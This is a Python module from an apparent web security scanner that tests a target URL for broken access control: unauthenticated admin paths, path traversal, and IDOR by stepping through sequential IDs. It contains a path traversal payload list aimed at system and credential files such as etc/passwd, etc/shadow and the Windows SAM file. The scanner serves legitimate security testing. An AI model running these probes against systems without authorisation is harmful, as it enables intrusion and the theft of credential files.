"""
A01:2021 - Broken Access Control Attack Module.

This module implements detection of broken access control vulnerabilities including:
- Insecure Direct Object References (IDOR)
- Missing function-level access control
- Path traversal attempts
- Privilege escalation via parameter manipulation
"""

import re
import time
from typing import Generator, Dict, Any, List

# noqa: F401 - kept for future use in access control testing
from urllib.parse import urljoin, urlparse, parse_qs, urlencode  # noqa: F401

from attacks.base import Finding, Severity
from attacks.owasp.base_owasp import BaseOWASPAttack, OWASPCategory, OWASPTestCase
from attacks.owasp import OWASPRegistry


@OWASPRegistry.register("a01")
class BrokenAccessControlAttack(BaseOWASPAttack):
    """
    Broken Access Control vulnerability scanner.

    Tests for common access control flaws including IDOR, path traversal,
    and missing authorization checks.
    """

    name = "Broken Access Control Scanner"
    description = "Detects broken access control vulnerabilities including IDOR and path traversal"
    category = OWASPCategory.A01_BROKEN_ACCESS_CONTROL

    # Common paths that should require authentication
    PROTECTED_PATHS = [
        "/admin",
        "/admin/",
        "/administrator",
        "/manage",
        "/management",
        "/dashboard",
        "/config",
        "/configuration",
        "/settings",
        "/user/admin",
        "/users",
        "/api/users",
        "/api/admin",
        "/console",
        "/portal",
        "/private",
        "/internal",
        "/backup",
        "/backups",
        "/logs",
        "/log",
        "/debug",
        "/test",
        "/dev",
        "/staging",
    ]

    # Path traversal payloads
    PATH_TRAVERSAL_PAYLOADS = [
        "../",
        "..\\",
        "....//",
        "....\\\\",
        "%2e%2e%2f",
        "%2e%2e/",
        "..%2f",
        "%2e%2e%5c",
        "..%5c",
        "..%255c",
        "..%c0%af",
        "..%c1%9c",
        ".../",
        "..../",
    ]

    # Common sensitive files to check via path traversal
    SENSITIVE_FILES = [
        "etc/passwd",
        "etc/shadow",
        "windows/win.ini",
        "windows/system32/config/sam",
        "boot.ini",
        "proc/self/environ",
        "var/log/apache2/access.log",
    ]

    # IDOR test patterns
    IDOR_PATTERNS = [
        (r"/user/(\d+)", "user_id"),
        (r"/profile/(\d+)", "profile_id"),
        (r"/account/(\d+)", "account_id"),
        (r"/order/(\d+)", "order_id"),
        (r"/invoice/(\d+)", "invoice_id"),
        (r"/document/(\d+)", "document_id"),
        (r"/file/(\d+)", "file_id"),
        (r"/download/(\d+)", "download_id"),
        (r"\?id=(\d+)", "id"),
        (r"\?user_id=(\d+)", "user_id"),
        (r"\?uid=(\d+)", "uid"),
    ]

    def __init__(self):
        super().__init__()
        self._test_paths: List[str] = []

    def configure(self, **kwargs) -> None:
        """
        Configure broken access control attack parameters.

        Args:
            additional_paths: Extra paths to test for access control
            test_idor: Whether to test for IDOR vulnerabilities (default: True)
            test_path_traversal: Whether to test path traversal (default: True)
            idor_range: Range of IDs to test for IDOR (default: 10)
        """
        super().configure(**kwargs)
        self._config["additional_paths"] = kwargs.get("additional_paths", [])
        self._config["test_idor"] = kwargs.get("test_idor", True)
        self._config["test_path_traversal"] = kwargs.get("test_path_traversal", True)
        self._config["idor_range"] = kwargs.get("idor_range", 10)

    def get_config_options(self) -> Dict[str, Any]:
        """Get configuration options."""
        options = super().get_config_options()
        options.update(
            {
                "additional_paths": {
                    "type": "array",
                    "default": [],
                    "description": "Additional paths to test for access control",
                },
                "test_idor": {
                    "type": "boolean",
                    "default": True,
                    "description": "Test for IDOR vulnerabilities",
                },
                "test_path_traversal": {
                    "type": "boolean",
                    "default": True,
                    "description": "Test for path traversal vulnerabilities",
                },
                "idor_range": {
                    "type": "integer",
                    "default": 10,
                    "description": "Number of sequential IDs to test for IDOR",
                },
            }
        )
        return options

    def get_test_cases(self) -> List[OWASPTestCase]:
        """Get test cases for broken access control."""
        return [
            OWASPTestCase(
                name="Protected Path Access",
                description="Test access to administrative and protected paths",
                category=OWASPCategory.A01_BROKEN_ACCESS_CONTROL,
                payloads=self.PROTECTED_PATHS,
                detection_patterns=["admin", "dashboard", "configuration", "password"],
            ),
            OWASPTestCase(
                name="Path Traversal",
                description="Test for path traversal vulnerabilities",
                category=OWASPCategory.A01_BROKEN_ACCESS_CONTROL,
                payloads=self.PATH_TRAVERSAL_PAYLOADS,
                detection_patterns=["root:", "[boot loader]", "[extensions]"],
            ),
            OWASPTestCase(
                name="IDOR Detection",
                description="Test for Insecure Direct Object References",
                category=OWASPCategory.A01_BROKEN_ACCESS_CONTROL,
                payloads=[],  # Dynamic based on target
                detection_patterns=[],
            ),
        ]

    def _test_protected_paths(self, target: str) -> Generator[Finding, None, None]:
        """Test access to protected paths without authentication."""
        base_url = self._normalize_url(target)
        paths = self.PROTECTED_PATHS + self._config.get("additional_paths", [])
        total_paths = len(paths)

        for idx, path in enumerate(paths):
            if self.is_cancelled():
                break

            url = self._build_url(base_url, path)
            response = self._make_request(url)

            if response and response.status_code == 200:
                # Check for signs of actual admin/protected content
                content_lower = response.text.lower()
                indicators = [
                    "admin",
                    "dashboard",
                    "configuration",
                    "settings",
                    "manage",
                    "user",
                    "password",
                    "delete",
                    "modify",
                ]
                found_indicators = [i for i in indicators if i in content_lower]

                if found_indicators:
                    yield Finding(
                        title="Unprotected Administrative Path",
                        severity=Severity.HIGH,
                        description=f"Administrative path '{path}' is accessible without authentication",
                        evidence=f"URL: {url}, Status: {response.status_code}, "
                        f"Found indicators: {', '.join(found_indicators[:5])}",
                        remediation="Implement proper authentication and authorization checks. "
                        "Use role-based access control (RBAC) for administrative functions.",
                        metadata={
                            "path": path,
                            "status_code": response.status_code,
                            "indicators": found_indicators,
                        },
                    )

            # Update progress for this section (0-33%)
            self.set_progress((idx + 1) / total_paths * 33)
            time.sleep(self._delay_between_requests)

    def _test_path_traversal(self, target: str) -> Generator[Finding, None, None]:
        """Test for path traversal vulnerabilities."""
        if not self._config.get("test_path_traversal", True):
            return

        base_url = self._normalize_url(target)

        # Test path traversal in URL path
        test_endpoints = ["/file", "/download", "/read", "/view", "/get", "/load", "/include"]
        total_tests = (
            len(test_endpoints) * len(self.PATH_TRAVERSAL_PAYLOADS) * len(self.SENSITIVE_FILES)
        )
        current_test = 0

        for endpoint in test_endpoints:
            for payload in self.PATH_TRAVERSAL_PAYLOADS:
                for sensitive_file in self.SENSITIVE_FILES:
                    if self.is_cancelled():
                        return

                    # Construct various test URLs
                    test_urls = [
                        f"{base_url}{endpoint}?file={payload}{sensitive_file}",
                        f"{base_url}{endpoint}?path={payload}{sensitive_file}",
                        f"{base_url}{endpoint}?name={payload}{sensitive_file}",
                        f"{base_url}{endpoint}/{payload}{sensitive_file}",
                    ]

                    for test_url in test_urls:
                        response = self._make_request(test_url)

                        if response and response.status_code == 200:
                            # Check for signs of file content disclosure
                            if self._check_path_traversal_success(response.text, sensitive_file):
                                yield Finding(
                                    title="Path Traversal Vulnerability",
                                    severity=Severity.CRITICAL,
                                    description="Path traversal vulnerability allows reading sensitive files",
                                    evidence=f"URL: {test_url}, Response contains sensitive file content",
                                    remediation="Sanitize file path inputs. Use allowlists for permitted files. "
                                    "Avoid using user input directly in file operations.",
                                    metadata={
                                        "endpoint": endpoint,
                                        "payload": payload,
                                        "file": sensitive_file,
                                        "url": test_url,
                                    },
                                )

                    current_test += 1
                    # Update progress for this section (33-66%)
                    self.set_progress(33 + (current_test / total_tests * 33))
                    time.sleep(self._delay_between_requests)

    def _check_path_traversal_success(self, content: str, file: str) -> bool:
        """Check if path traversal was successful based on response content."""
        # Linux /etc/passwd indicators
        if "etc/passwd" in file:
            return bool(re.search(r"root:.*:0:0:", content))

        # Windows win.ini indicators
        if "win.ini" in file:
            return "[extensions]" in content.lower() or "[fonts]" in content.lower()

        # Windows SAM file
        if "sam" in file.lower():
            return "administrator" in content.lower()

        # boot.ini
        if "boot.ini" in file:
            return "[boot loader]" in content.lower()

        return False

    def _test_idor(self, target: str) -> Generator[Finding, None, None]:
        """Test for Insecure Direct Object Reference vulnerabilities."""
        if not self._config.get("test_idor", True):
            return

        base_url = self._normalize_url(target)
        idor_range = self._config.get("idor_range", 10)

        # Test common IDOR patterns
        test_endpoints = [
            "/api/user/{id}",
            "/api/users/{id}",
            "/api/profile/{id}",
            "/api/account/{id}",
            "/user/{id}",
            "/profile/{id}",
            "/account/{id}",
            "/order/{id}",
            "/invoice/{id}",
        ]

        total_tests = len(test_endpoints) * idor_range
        current_test = 0
        baseline_responses = {}

        for endpoint in test_endpoints:
            # Get baseline response for ID 1
            baseline_url = self._build_url(base_url, endpoint.replace("{id}", "1"))
            baseline_response = self._make_request(baseline_url)

            if baseline_response and baseline_response.status_code == 200:
                baseline_responses[endpoint] = {
                    "status": baseline_response.status_code,
                    "length": len(baseline_response.text),
                }

                # Test other IDs
                for test_id in range(2, idor_range + 1):
                    if self.is_cancelled():
                        return

                    test_url = self._build_url(base_url, endpoint.replace("{id}", str(test_id)))
                    response = self._make_request(test_url)

                    if response and response.status_code == 200:
                        # Check if we got different data (potential IDOR)
                        if len(response.text) != baseline_responses[endpoint]["length"]:
                            yield Finding(
                                title="Potential IDOR Vulnerability",
                                severity=Severity.HIGH,
                                description=(
                                    "Endpoint may be vulnerable to Insecure Direct Object Reference. "
                                    "Different content returned for different IDs without authorization check."
                                ),
                                evidence=f"Baseline URL: {baseline_url}, Test URL: {test_url}, "
                                f"Different response lengths indicate accessible data",
                                remediation=(
                                    "Implement proper authorization checks. Verify the requesting user "
                                    "has permission to access the requested resource. Use indirect references."
                                ),
                                metadata={
                                    "endpoint": endpoint,
                                    "baseline_id": 1,
                                    "test_id": test_id,
                                    "baseline_length": baseline_responses[endpoint]["length"],
                                    "test_length": len(response.text),
                                },
                            )
                            break  # One finding per endpoint is enough

                    current_test += 1
                    time.sleep(self._delay_between_requests)
            else:
                current_test += idor_range

            # Update progress for this section (66-100%)
            self.set_progress(66 + (current_test / total_tests * 34))

    def run(self, target: str) -> Generator[Finding, None, None]:
        """
        Execute broken access control attack against the target.

        Args:
            target: Target URL

        Yields:
            Finding objects for each vulnerability discovered
        """
        self.reset()
        self._is_running = True

        yield Finding(
            title="Broken Access Control Scan Started",
            severity=Severity.INFO,
            description="Starting scan for broken access control vulnerabilities",
            evidence=f"Target: {target}",
            remediation="N/A - Informational",
            metadata={"target": target},
        )

        try:
            # Test 1: Protected paths (0-33%)
            yield from self._test_protected_paths(target)

            # Test 2: Path traversal (33-66%)
            yield from self._test_path_traversal(target)

            # Test 3: IDOR (66-100%)
            yield from self._test_idor(target)

        finally:
            self._is_running = False
            self.set_progress(100.0)
            self.cleanup()

        yield Finding(
            title="Broken Access Control Scan Completed",
            severity=Severity.INFO,
            description="Completed scan for broken access control vulnerabilities",
            evidence=f"Target: {target}",
            remediation="N/A - Informational",
            metadata={"target": target},
        )
